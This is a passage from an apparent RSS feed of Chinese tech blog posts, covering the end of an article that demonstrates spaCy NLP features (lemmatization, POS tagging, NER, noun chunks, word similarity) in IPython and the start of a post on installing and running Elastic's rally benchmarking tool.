&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;lemmatize&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;lemmatize&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;1510296&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw3&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;1351&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;for&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;480&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;spacy&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;spacy&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;173783&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;.&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;.&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;419&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;I&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;i&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;570&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;love&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;love&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;644&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;these&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;these&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;642&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;books&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;book&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;1011&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;词性标注(POS Tagging):&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;codecolorer-container python default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;python codecolorer&quot;&gt;In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;kw3&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;kw1&quot;&gt;in&lt;/span&gt; test_doc:                                                     &lt;br&gt;
    &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw3&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw3&quot;&gt;token&lt;/span&gt;.&lt;span class=&quot;me1&quot;&gt;pos_&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw3&quot;&gt;token&lt;/span&gt;.&lt;span class=&quot;me1&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
   ....:     &lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;you&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;PRON&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;are&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;VERB&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;best&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;ADJ&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;.&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;PUNCT&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;it&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;PRON&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw1&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;VERB&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;lemmatize&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;ADJ&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw3&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;NOUN&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;ADP&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;spacy&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;NOUN&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;.&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;PUNCT&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;I&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;PRON&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;love&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;VERB&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;these&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;DET&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;books&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;NOUN&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;命名实体识别（NER）：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;codecolorer-container python default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;python codecolorer&quot;&gt;In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: test_doc &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; nlp&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;u&lt;span class=&quot;st0&quot;&gt;&quot;Rami Eid is studying at Stony Brook University in New York&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt; ent &lt;span class=&quot;kw1&quot;&gt;in&lt;/span&gt; test_doc.&lt;span class=&quot;me1&quot;&gt;ents&lt;/span&gt;:&lt;br&gt;
    &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;ent&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; ent.&lt;span class=&quot;me1&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; ent.&lt;span class=&quot;me1&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
   ....:     &lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;Rami Eid&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;PERSON&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;346&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;Stony Brook University&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;ORG&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;349&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;New York&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;GPE&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;350&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;名词短语提取：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;codecolorer-container python default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;height:450px;&quot;&gt;&lt;div class=&quot;python codecolorer&quot;&gt;In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: test_doc &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; nlp&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;u&lt;span class=&quot;st0&quot;&gt;&#39;Natural language processing (NLP) deals with the application of computational models to text or speech data. Application areas within NLP include automatic (machine) translation between languages; dialogue systems, which allow a human to interact with a machine using natural language; and information extraction, where the goal is to transform unstructured text into structured (database) representations that can be searched and browsed in flexible ways. NLP technologies are having a dramatic impact on the way people interact with computers, on the way people interact with each other through the use of language, and on the way people access the vast amount of linguistic data now in electronic form. From a scientific viewpoint, NLP involves fundamental questions of how to structure formal models (for example statistical models) of natural language phenomena, and of how to design algorithms that implement these models.&#39;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt; np &lt;span class=&quot;kw1&quot;&gt;in&lt;/span&gt; test_doc.&lt;span class=&quot;me1&quot;&gt;noun_chunks&lt;/span&gt;:&lt;br&gt;
    &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;np&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
   ....:     &lt;br&gt;
Natural language processing&lt;br&gt;
Natural language processing &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;NLP&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; deals&lt;br&gt;
the application&lt;br&gt;
computational models&lt;br&gt;
text&lt;br&gt;
speech&lt;br&gt;
data&lt;br&gt;
Application areas&lt;br&gt;
NLP&lt;br&gt;
automatic &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;machine&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; translation&lt;br&gt;
languages&lt;br&gt;
dialogue systems&lt;br&gt;
a human&lt;br&gt;
a machine&lt;br&gt;
natural language&lt;br&gt;
information extraction&lt;br&gt;
the goal&lt;br&gt;
unstructured text&lt;br&gt;
structured &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;database&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; representations&lt;br&gt;
flexible ways&lt;br&gt;
NLP technologies&lt;br&gt;
a dramatic impact&lt;br&gt;
the way&lt;br&gt;
people&lt;br&gt;
computers&lt;br&gt;
the way&lt;br&gt;
people&lt;br&gt;
the use&lt;br&gt;
language&lt;br&gt;
the way&lt;br&gt;
people&lt;br&gt;
the vast amount&lt;br&gt;
linguistic data&lt;br&gt;
electronic form&lt;br&gt;
a scientific viewpoint&lt;br&gt;
NLP&lt;br&gt;
fundamental questions&lt;br&gt;
formal models&lt;br&gt;
example&lt;br&gt;
natural language phenomena&lt;br&gt;
algorithms&lt;br&gt;
these models&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;基于词向量计算两个单词的相似度：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;codecolorer-container python default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;height:450px;&quot;&gt;&lt;div class=&quot;python codecolorer&quot;&gt;In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: test_doc &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; nlp&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;u&lt;span class=&quot;st0&quot;&gt;&quot;Apples and oranges are similar. Boots and hippos aren&#39;t.&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: apples &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; test_doc&lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;apples&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
Apples&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: oranges &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; test_doc&lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;oranges&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
oranges&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: boots &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; test_doc&lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;boots&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
Boots&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: hippos &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; test_doc&lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;hippos&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
hippos&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: apples.&lt;span class=&quot;me1&quot;&gt;similarity&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;oranges&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
Out&lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;nu0&quot;&gt;0.77809414836023805&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: boots.&lt;span class=&quot;me1&quot;&gt;similarity&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;hippos&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
Out&lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;nu0&quot;&gt;0.038474555379008429&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;当然，spaCy还包括句法分析的相关功能等。另外值得关注的是 spaCy 从1.0版本起，加入了对&lt;a href=&quot;http://www.52nlp.cn/tag/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0&quot; target=&quot;_blank&quot;&gt;深度学习&lt;/a&gt;工具的支持，例如 &lt;a href=&quot;http://www.52nlp.cn/tag/tensorflow&quot; target=&quot;_blank&quot;&gt;Tensorflow&lt;/a&gt; 和 Keras 等，这方面具体可以参考官方文档给出的一个对情感分析（&lt;a href=&quot;http://sentimentanalysis.net/&quot; target=&quot;_blank&quot;&gt;Sentiment Analysis&lt;/a&gt;）模型进行分析的例子：&lt;a href=&quot;https://spacy.io/docs/usage/deep-learning&quot; target=&quot;_blank&quot;&gt;Hooking a deep learning model into spaCy&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;参考：&lt;br&gt;
&lt;a href=&quot;https://spacy.io/docs/usage/&quot; target=&quot;_blank&quot;&gt;spaCy官方文档&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://textminingonline.com/getting-started-with-spacy&quot; target=&quot;_blank&quot;&gt;Getting Started with spaCy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;注：原创文章，转载请注明出处及保留链接“&lt;a href=&quot;http://www.52nlp.cn&quot;&gt;我爱自然语言处理&lt;/a&gt;”：&lt;a href=&quot;http://www.52nlp.cn&quot;&gt;http://www.52nlp.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文链接地址：&lt;a href=&quot;http://www.52nlp.cn/?p=9386&quot;&gt;自然语言处理工具包spaCy介绍&lt;/a&gt; &lt;a href=&quot;http://www.52nlp.cn/?p=9386&quot;&gt;http://www.52nlp.cn/?p=9386&lt;/a&gt;&lt;/p&gt;

											

</description>
        <pubDate>Sat, 12 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-11-12-%25e8%2587%25aa%25e7%2584%25b6%25e8%25af%25ad%25e8%25a8%2580%25e5%25a4%2584%25e7%2590%2586%25e5%25b7%25a5%25e5%2585%25b7%25e5%258c%2585spacy%25e4%25bb%258b%25e7%25bb%258d-408ddfd8f.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-11-12-%25e8%2587%25aa%25e7%2584%25b6%25e8%25af%25ad%25e8%25a8%2580%25e5%25a4%2584%25e7%2590%2586%25e5%25b7%25a5%25e5%2585%25b7%25e5%258c%2585spacy%25e4%25bb%258b%25e7%25bb%258d-408ddfd8f.html</guid>
        
        
        <category>52nlp</category>
        
      </item>
    
      <item>
        <title>Elastic 官方压测工具 rally 试用</title>
        <description>

  
  &lt;div style=&quot;background-color: #FFF;&quot;&gt;
    &lt;p&gt;rally 工具是 Elastic 官方开源的针对性性能压测工具。目前 Elasticsearch 的 nightly performance report 就是由 rally 产生的。对自己在做 ES 源码修改，或者ES 应用调优的人来说，通过 rally 验证自己的修改效果，是一件很需要且容易的事情。&lt;/p&gt;
&lt;p&gt;rally 依赖 python3.4+，所以为了试用直接在自己电脑上安装比较快。直接 &lt;code class=&quot;highlighter-rouge&quot;&gt;pip3 install esrally&lt;/code&gt; 即可。&lt;/p&gt;
&lt;p&gt;电脑上没有 gradle 的无法从最新 master 代码编译(Macbook 上即使通过 dmg 安装的 gradle 也识别不到)。只能下 binary 包。所以运行方式为：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/local/Library/Frameworks/Python.framework/Versions/3.5/bin/esrally --pipeline=from-distribution --distribution-version=1.7.3
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;默认情况下压测采用的数据集叫 geonames，是一个 2.8GB 大的 JSON 数据。ES 也提供了一系列其他类型的压测数据集。如果要切换数据集采用 &lt;code class=&quot;highlighter-rouge&quot;&gt;--track&lt;/code&gt; 参数：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/local/Library/Frameworks/Python.framework/Versions/3.5/bin/esrally --pipeline=from-distribution --distribution-version=1.7.3 --track=geonames
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;重复运行的时候可以修改 ~/.rally/rally.ini 里的 &lt;code class=&quot;highlighter-rouge&quot;&gt;tracks[default.url]&lt;/code&gt; 为第一次运行时下载的地址：&lt;strong&gt;~/.rally/benchmarks/tracks/default&lt;/strong&gt; 。然后离线运行：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
